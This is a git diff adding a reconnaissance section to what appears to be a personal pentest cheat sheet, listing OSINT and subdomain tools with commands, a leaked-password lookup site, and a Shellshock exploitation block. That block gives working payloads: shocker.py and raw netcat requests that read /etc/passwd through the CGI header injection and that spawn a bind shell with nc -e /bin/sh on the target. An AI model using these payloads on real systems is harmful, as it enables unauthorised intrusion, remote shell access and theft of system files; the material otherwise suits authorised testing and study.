@@ -24,6 +24,90 @@ update-rc.d /path/to/the/script defaults
 
 Delete Script from defaults
 
+# Reconnaissance(Information Gathering) start
+
+- [hunter.io](https://hunter.io/) - known email and users for a specific domain
+- theharvester - search for emails in several search engines
+
+    ```bash
+    theHarvester -d *.co.il -l 500 -b google
+    ```
+
+- sublist3r - search for subdomain for a given domain
+- [crt.sh](http://crt.sh) - subdomains  search with %.tesla.co.il
+- [httprobe](https://github.com/tomnomnom/httprobe) - will check a list of domain if they are alive, we can fire it sublis3r results
+- [amass](https://github.com/OWASP/Amass) - can also search for subdomains and more
+
+    ```bash
+    amass enum -d tesla.com
+    ```
+
+- [builtwith](https://builtwith.com/) - show frameworks and technologies any domain is built with, then we can search for exploits for those technologies
+- [wappalizer](https://www.wappalyzer.com/download/) - browser addon that does almost the same as builtwith
+- whatweb - same but uglier than builtwith
+- [sumrecon](https://github.com/Gr1mmie/sumrecon) - script that automate some of the above
+- [shodan.io](http://shodan.io) - find open ports and services online
+- [dnsdumpster](https://dnsdumpster.com/) - dns recon & research, find & lookup dns records
+- [ipinfo.io](http://ipinfo.io) - ip info
+- [dehashed](https://www.dehashed.com) - find leaked emails and passwords
+- simplyemail - enumerate all the online places (github, target site etc)
+
+    ```
+    git clone https://github.com/killswitch-GUI/SimplyEmail.git
+    ./SimplyEmail.py -all -e TARGET-DOMAIN
+    ```
+
+- DNSRecon - DNS Bruteforce
+
+    ```bash
+    dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
+    ```
+
+- Skipfish - prepares an interactive sitemap for the targeted site
+
+    ```bash
+    # basic scan
+    skipfish -o out_dir https://www.host.com
+    # using cookies to access authenticated pages
+    skipfish -o out_dir -I urls_to_scan -X urls_not_to_scan -C cookie1=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX -C cookie2=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX  https://www.host.com
+    ```
+
+- [namechk](https://namechk.com/) / [whatsmyname](https://whatsmyname.app/) / [namecheckup](https://namecheckup.com/) - OSINT use accounts around the web
+- [maltego](https://sectools.org/tool/maltego/) - data mining application
+
+- Exploiting Shellshock
+
+    ```bash
+    git clone https://github.com/nccgroup/shocker
+    ```
+
+    ```bash
+    ./shocker.py -H TARGET --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
+    ```
+
+    cat file (view file contents)
+
+    ```bash
+    echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
+    ```
+
+    Shell Shock run bind shell
+
+    ```bash
+    echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
+    ```
+
+    Shell Shock reverse Shell
+
+    ```bash
+    nc -l -p 443
+    ```
+
+
+# Reconnaissance(Information Gathering) done
+
+
+
 ## Vim
 
 `i` for insert mode
